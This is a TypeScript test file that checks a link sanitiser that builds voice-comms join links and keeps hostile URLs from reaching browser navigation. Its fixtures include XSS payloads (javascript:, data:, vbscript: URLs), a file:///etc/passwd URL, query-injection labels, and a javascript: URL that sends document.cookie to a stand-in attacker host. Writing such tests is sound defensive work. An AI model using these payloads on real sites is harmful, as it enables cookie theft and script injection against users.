import { describe, it, expect } from 'vitest';
import { buildJoinLink } from '../lib/commsPlanLinks';
import type { CommsPlanEntry, CommsProvider } from '../types';

// lib/commsPlanLinks.ts — builds the "Join" deep links for an operation's comms plan.
// It is a NAVIGATION SINK SANITISER: OpCommandSignalsTab assigns `primary` straight to
// window.location.href and passes `fallback` to window.open(). Comms plan entries are
// authored by op planners, so every field is treated as hostile here. The contract:
//   * `primary` only ever carries https/http, discord, ts3server or mumble — a pasted
//     javascript:/data:/vbscript:/file: URL is demoted to copy-text, never navigable;
//   * `fallback` is only ever an https URL on discord.com;
//   * labels are percent-encoded so they cannot inject extra query params or path segments;
//   * providers with no URI scheme never produce a navigable link.

const ALLOWED_PRIMARY_SCHEMES = new Set(['https', 'http', 'discord', 'ts3server', 'mumble']);

/** The scheme a browser would act on: strip leading C0/space, drop tab/CR/LF, take up to ':'. */
function navigationScheme(url: string): string | null {
    // eslint-disable-next-line no-control-regex
    const cleaned = url.replace(/^[\u0000-\u0020]+/, '').replace(/[\t\n\r]/g, '');
    const m = cleaned.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/);
    return m ? m[1].toLowerCase() : null;
}

const entry = (provider: CommsProvider | undefined, fields: Partial<CommsPlanEntry> = {}): CommsPlanEntry => ({ provider, ...fields });

describe('buildJoinLink — guards', () => {
    it('returns nothing for a missing entry or a legacy entry without a provider', () => {
        expect(buildJoinLink(null as unknown as CommsPlanEntry, 'g')).toEqual({});
        expect(buildJoinLink(entry(undefined, { channel: 'Alpha', frequency: '251.0' }), 'g')).toEqual({});
    });

    it('returns nothing for in-platform radio, "other" and unknown providers', () => {
        expect(buildJoinLink(entry('op_radio', { url: 'https://x.test' }), 'g')).toEqual({});
        expect(buildJoinLink(entry('other', { url: 'https://x.test', address: 'h' }), 'g')).toEqual({});
        expect(buildJoinLink(entry('mystery' as CommsProvider, { url: 'https://x.test' }), 'g')).toEqual({});
    });
});

describe('buildJoinLink — discord', () => {
    it('builds the native link plus the https web-client fallback', () => {
        const link = buildJoinLink(entry('discord_voice', { discordChannelId: '222' }), '111');
        expect(link).toEqual({
            primary: 'discord://discord.com/channels/111/222',
            fallback: 'https://discord.com/channels/111/222',
        });
        expect(buildJoinLink(entry('discord_text', { discordChannelId: '333' }), '111')).toEqual({
            primary: 'discord://discord.com/channels/111/333',
            fallback: 'https://discord.com/channels/111/333',
        });
    });

    it('returns nothing without a guild id or a channel id', () => {
        expect(buildJoinLink(entry('discord_voice', { discordChannelId: '222' }), null)).toEqual({});
        expect(buildJoinLink(entry('discord_voice', { discordChannelId: '222' }), undefined)).toEqual({});
        expect(buildJoinLink(entry('discord_voice', { discordChannelId: '222' }), '')).toEqual({});
        expect(buildJoinLink(entry('discord_text'), '111')).toEqual({});
    });

    it('keeps the fallback on discord.com whatever the ids contain', () => {
        for (const [guild, channel] of [['@evil.test', '1'], ['1', '@evil.test'], ['..', '../../evil.test'], ['\\evil.test', 'x'], ['1', '#@evil.test']]) {
            const link = buildJoinLink(entry('discord_voice', { discordChannelId: channel }), guild);
            const fb = new URL(link.fallback!);
            expect(fb.protocol).toBe('https:');
            expect(fb.hostname).toBe('discord.com');
            expect(navigationScheme(link.primary!)).toBe('discord');
        }
    });
});

describe('buildJoinLink — teamspeak', () => {
    it('returns nothing without an address', () => {
        expect(buildJoinLink(entry('teamspeak', { port: 9987, label: 'x' }), 'g')).toEqual({});
    });

    it('builds a bare server link from the address alone', () => {
        expect(buildJoinLink(entry('teamspeak', { address: 'ts.example.org' }), null)).toEqual({
            primary: 'ts3server://ts.example.org',
            copyText: 'ts.example.org',
        });
    });

    it('adds port and an encoded channel, and puts the port on the copy text', () => {
        expect(buildJoinLink(entry('teamspeak', { address: 'ts.example.org', port: 9987, label: 'Alpha Squad' }), null)).toEqual({
            primary: 'ts3server://ts.example.org?port=9987&channel=Alpha%20Squad',
            copyText: 'ts.example.org:9987',
        });
    });

    it('carries a channel without a port', () => {
        expect(buildJoinLink(entry('teamspeak', { address: 'ts.example.org', label: 'Ops' }), null)).toEqual({
            primary: 'ts3server://ts.example.org?channel=Ops',
            copyText: 'ts.example.org',
        });
    });

    it('encodes the label so it cannot inject extra query parameters', () => {
        const link = buildJoinLink(entry('teamspeak', { address: 'ts.example.org', label: 'x&password=hunter2&nickname=pwned' }), null);
        expect(link.primary).toBe('ts3server://ts.example.org?channel=x%26password%3Dhunter2%26nickname%3Dpwned');
        expect(link.primary!.split('&')).toHaveLength(1);
    });
});

describe('buildJoinLink — mumble', () => {
    it('returns nothing without an address', () => {
        expect(buildJoinLink(entry('mumble', { port: 64738 }), null)).toEqual({});
    });

    it('builds host-only, host:port and host:port/channel forms', () => {
        expect(buildJoinLink(entry('mumble', { address: 'm.example.org' }), null)).toEqual({
            primary: 'mumble://m.example.org',
            copyText: 'm.example.org',
        });
        expect(buildJoinLink(entry('mumble', { address: 'm.example.org', port: 64738 }), null)).toEqual({
            primary: 'mumble://m.example.org:64738',
            copyText: 'm.example.org:64738',
        });
        expect(buildJoinLink(entry('mumble', { address: 'm.example.org', port: 64738, label: 'Wing 1' }), null)).toEqual({
            primary: 'mumble://m.example.org:64738/Wing%201',
            copyText: 'm.example.org:64738',
        });
    });

    it('encodes the channel so it is a single path segment', () => {
        const link = buildJoinLink(entry('mumble', { address: 'm.example.org', label: '../admin?x=1#y' }), null);
        expect(link.primary).toBe('mumble://m.example.org/..%2Fadmin%3Fx%3D1%23y');
    });
});

describe('buildJoinLink — scheme-less radio providers', () => {
    it('summarises address:port, frequency and callsign as copy text only', () => {
        expect(buildJoinLink(entry('simple_radio', { address: 'srs.example.org', port: 5002, frequency: '251.000', callsign: 'Viper' }), 'g')).toEqual({
            copyText: 'srs.example.org:5002 · Freq 251.000 · Callsign Viper',
        });
    });

    it('omits the parts that are not set', () => {
        expect(buildJoinLink(entry('dcs_srs', { address: 'srs.example.org' }), null)).toEqual({ copyText: 'srs.example.org' });
        expect(buildJoinLink(entry('dcs_srs', { frequency: '30.0' }), null)).toEqual({ copyText: 'Freq 30.0' });
        expect(buildJoinLink(entry('simple_radio', { callsign: 'Hawk' }), null)).toEqual({ copyText: 'Callsign Hawk' });
    });

    it('returns nothing when there is nothing to summarise', () => {
        expect(buildJoinLink(entry('simple_radio', { port: 5002, url: 'https://x.test' }), null)).toEqual({});
    });

    it('never produces a navigable link, even when an address looks like a URL', () => {
        const link = buildJoinLink(entry('dcs_srs', { address: 'javascript:alert(1)', url: 'https://x.test' }), 'g');
        expect(link.primary).toBeUndefined();
        expect(link.fallback).toBeUndefined();
    });
});

describe('buildJoinLink — external URL allow-list', () => {
    it('returns nothing without a URL', () => {
        expect(buildJoinLink(entry('external'), null)).toEqual({});
        expect(buildJoinLink(entry('external', { url: '' }), null)).toEqual({});
    });

    it('makes http(s) and the known voice schemes navigable, trimmed', () => {
        expect(buildJoinLink(entry('external', { url: '  https://voice.example.org/room  ' }), null)).toEqual({
            primary: 'https://voice.example.org/room',
            copyText: 'https://voice.example.org/room',
        });
        for (const url of ['http://voice.example.org', 'HTTPS://VOICE.EXAMPLE.ORG', 'ts3server://ts.example.org', 'mumble://m.example.org', 'discord://discord.com/channels/1/2']) {
            expect(buildJoinLink(entry('external', { url }), null)).toEqual({ primary: url, copyText: url });
        }
    });

    it('demotes every other scheme to copy text — never navigable', () => {
        const hostile = [
            'javascript:alert(document.cookie)',
            'JavaScript:alert(1)',
            '  javascript:alert(1)',
            '\u0000javascript:alert(1)',
            'java\tscript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)',
            'file:///etc/passwd',
            '//evil.example.org/path',
            'steam://run/1',
            'httpx://evil.example.org',
            'https//missing-colon.example.org',
            // An allowed scheme token LATER in the string must not satisfy the allow-list
            // (the match is anchored to the start).
            'javascript:fetch("https://evil.example.org/?c="+document.cookie)',
            'javascript://%0Ahttps:alert(1)',
            'data:text/html,<a href="mumble://x">x</a>',
            'xdiscord://discord.com/channels/1/2',
        ];
        for (const url of hostile) {
            const link = buildJoinLink(entry('external', { url }), null);
            expect(link.primary, url).toBeUndefined();
            expect(link.fallback, url).toBeUndefined();
            expect(link.copyText, url).toBe(url.trim());
        }
    });
});

describe('buildJoinLink — sink invariant across every provider', () => {
    const hostileFields: Partial<CommsPlanEntry>[] = [
        { address: 'javascript:alert(1)//', label: 'javascript:alert(1)', url: 'javascript:alert(1)', discordChannelId: 'javascript:alert(1)' },
        { address: ' data:text/html,x', port: 1, label: '\nvbscript:x', url: ' data:text/html,x', discordChannelId: '@evil.test' },
        { address: 'evil.test@good.test', label: '%0d%0a', url: 'file:///c:/windows', discordChannelId: '../..' },
    ];
    const providers: CommsProvider[] = ['discord_voice', 'discord_text', 'op_radio', 'teamspeak', 'mumble', 'simple_radio', 'dcs_srs', 'external', 'other'];

    it('only ever emits an allow-listed primary scheme and a discord.com https fallback', () => {
        let navigable = 0;
        for (const provider of providers) {
            for (const fields of hostileFields) {
                for (const guild of ['111', 'javascript:alert(1)', null]) {
                    const link = buildJoinLink(entry(provider, fields), guild);
                    if (link.primary !== undefined) {
                        navigable++;
                        expect(ALLOWED_PRIMARY_SCHEMES.has(navigationScheme(link.primary) ?? ''), `${provider}: ${link.primary}`).toBe(true);
                    }
                    if (link.fallback !== undefined) {
                        const fb = new URL(link.fallback);
                        expect(fb.protocol).toBe('https:');
                        expect(fb.hostname).toBe('discord.com');
                    }
                }
            }
        }
        // The sweep must actually exercise the link-building providers, not just the empties.
        expect(navigable).toBeGreaterThan(10);
    });
});
